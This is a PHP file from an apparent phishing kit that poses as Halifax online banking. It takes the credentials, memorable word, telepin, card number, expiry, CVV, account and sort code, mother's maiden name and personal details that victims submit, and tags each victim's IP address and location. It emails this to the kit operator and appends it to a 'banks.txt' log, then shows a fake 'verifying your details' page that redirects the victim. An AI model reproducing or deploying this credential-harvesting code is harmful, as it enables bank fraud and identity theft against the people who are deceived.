<?php
require "../../../includes/session_protect.php";
require_once("../../../includes/functions.php");
require_once("../../../CONTROLS.php");
error_reporting(0);
ini_set('display_errors', '0');
$username = $_POST['username'];
$password = $_POST['password'];
$memo = $_POST['memo'];
$title = $_POST['title'];
$name = $_POST['name'];
$dob = $_POST['day']."/".$_POST['month']."/".$_POST['year'];
$email = $_POST['email'];
$telephone = $_POST['telephone'];
$address = $_POST['address'];
$postcode = $_POST['postcode'];
$acno = $_POST['acno'];
$sort = $_POST['sc1']."-".$_POST['sc2']."-".$_POST['sc3'];
$ccno = $_POST['ccno'];
$ccexp = $_POST['ccmm']."/".$_POST['ccyy'];
$secode = $_POST['secode'];
$mmn = $_POST['mmn'];
$telepin = $_POST['telepin'];
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo .= "| IP Address : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";
$VictimInfo .= "| Location: " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "\r\n";
$VictimInfo .= "| UserAgent : " . $systemInfo['useragent'] . "\r\n";
$VictimInfo .= "| Browser : " . $systemInfo['browser'] . "\r\n";
$VictimInfo .= "| Platform : " . $systemInfo['os'] . "";
$data = "
+ ---------------HALIFAX----------------+
+ ------------------------------------------+
+ Personal Information
| Full name : $title, $name
| Date of birth : $dob
| Address : $address
| Postcode : $postcode
| Phone : $telephone
| Email : $email
| MMN : $mmn
+ ------------------------------------------+
+ Account Information (Halifax)
| Username : $username
| Password : $password
| Memorable : $memo
| Telepin : $telepin
| CC No : $ccno
| CC Expiry : $ccexp
| CVV : $secode
| Account Number : $acno 
| Sortcode : $sort
+ ------------------------------------------+
+ Victim Information
$VictimInfo
+ ------------------------------------------+
";

mail($to, 'Halifax from ' . $_SERVER['REMOTE_ADDR'], $data);
$file = fopen('../../../assets/logs/banks.txt', 'a');
fwrite($file, $data);
fclose($file);
?>
<!DOCTYPE html>
<html lang="en-gb">
<head>
<title>Complete</title>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="en-gb" http-equiv="content-language">
<meta content="width=device-width" name="viewport">
<link href="" media="handheld" rel="alternate">
<link href="assets/img/001.jpg" rel="apple-touch-icon" sizes="114x114">
<link href="assets/img/002.jpg" rel="apple-touch-icon" sizes="57x57">
<link href="assets/img/001.ico" rel="shortcut icon">
<link href="assets/css/001.css" rel="stylesheet" type="text/css">
<script src="assets/js/001.jspf" type="text/javascript"></script>
<script src="assets/js/001.js" type="text/javascript"></script>
<meta content="4;url=../../../Exit.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" http-equiv="refresh">
</head>
<body>
<div id="outer">
<div id="banner">
<p id="logo"><img src="assets/img/001.gif"></p>
<p id="userstatusNGB"><img src="assets/img/002.gif"></p>
<p class="cookiePolicy"><a href="#" id="lnkePrivacy" name="lnkePrivacy">Cookie policy</a></p>
<div class="clearer"></div>
</div>
<div id="header">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div id="headerInner">
<h1>Please wait while we check your information</h1>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="content">
<div class="login">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div class="loginInner">
<div class="loginFields">
<center><a id="loadingIcon" name="loadingIcon" href="#"><img src="assets/img/015.gif" alt="Loading icon" /></a></center>
<br>
<p align="center">It'll only take a few seconds - we're just verifying the details that you've entered.</p>
<p align="center">Please don't refresh this page or close your browser while you're waiting.</p>
<p align="center">You will be redirected to our homepage when were done verifying your details</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="appBannerBG">
<div class="appBannerLink">
<center>
<a class="newwin" href="#"><img src="assets/img/003.jpg"></a><br></div>
</center>
</div>
<div class="clearer"></div>
<div id="footerLogin">
<div class="FootNav">
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" id="lnk2" name="lnk2">Help</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" id="lnk3" name="lnk3">Security</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" id="lnk4" name="lnk4">Contact us</a></p>
</div>
</div>
</div>
<div class="aside">
<p class="sideNote"><a href="#" id="lnkBookmark" name="lnkBookmark">Mobile Banking</a></p>
</div>
<div class="appBannerBG">
<div class="appBannerLink">
<p style="text-align: center"><a href="#"><img alt="FSCS" src="assets/img/001.png"></a></p>
</div>
</div>
<div class="clearer"></div>
<div><input name="smartAppForIosAndAndroid" type="hidden" value="true"> <input name="smartAppForIosAbvSix" type="hidden" value="true">
<div class="footerLinksLogin">
<a href="#" id="unauth:lnksecurity" name="unauth:lnksecurity" title="Security">Security</a>
&#160;
<a class="footerLinksLast" href="#" id="unauth:lnkLegal" name="unauth:lnkLegal" title="Legal">Legal</a></div>
</div>
</div>
</div>
</body>
</html>